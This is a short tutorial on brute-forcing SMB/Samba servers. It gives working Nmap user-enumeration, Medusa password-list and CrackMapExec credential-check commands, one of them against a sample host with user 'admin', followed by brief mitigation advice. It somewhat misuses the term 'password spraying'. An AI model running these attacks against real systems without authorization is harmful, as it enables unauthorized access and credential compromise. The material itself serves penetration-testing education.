# SMB/Samba Brute Force Attacks

## Overview
SMB (Server Message Block) is a protocol primarily used for providing shared access to files and printers. Brute force attacks on SMB/Samba servers target the credentials of users to gain unauthorized access to systems.

## User Enumeration with Nmap
User enumeration is the process of identifying valid usernames on a target system. This can be performed using Nmap with the following command:
```bash
nmap -p 445 --script smb-enum-users <target_ip>
```
This command uses the `smb-enum-users` script to list all users on the target machine.

## Password Spraying with Medusa
After identifying valid usernames, an attacker can perform a password spraying attack using Medusa. Here’s how to use Medusa for this purpose:
```bash
medusa -h <target_ip> -u <username> -P <password_list.txt> -M smbnt
```
Replace `<target_ip>`, `<username>`, and `<password_list.txt>` with your target's IP address, a valid username, and the path to your password list, respectively.

### Example
```bash
medusa -h 192.168.1.10 -u admin -P passwords.txt -M smbnt
```

## Using CrackMapExec
CrackMapExec (CME) is a powerful tool for post-exploitation in pen-testing scenarios. It can be used to check for valid user credentials and share enumeration:
```bash
crackmapexec smb <target_ip> -u <username> -p <password>
```

## Result Analysis
After running the attacks, analyze the results to identify successful logins and informations. Look for:
- Successful passwords
- Any accounts that exhibited unusual behavior

## Mitigation Strategies
To protect against SMB brute force attacks, consider the following strategies:
- Implement account lockout policies after a number of failed attempts.
- Use complex passwords to increase the difficulty of brute-forcing.
- Regularly monitor logs for unusual login activity.
- Employ intrusion detection systems (IDS) to detect brute force attempts in real-time.

## Conclusion
Understanding and protecting against SMB brute force attacks is crucial for maintaining the security of networks and sensitive data. By employing the methods discussed and remaining vigilant, organizations can better protect themselves from these attacks.
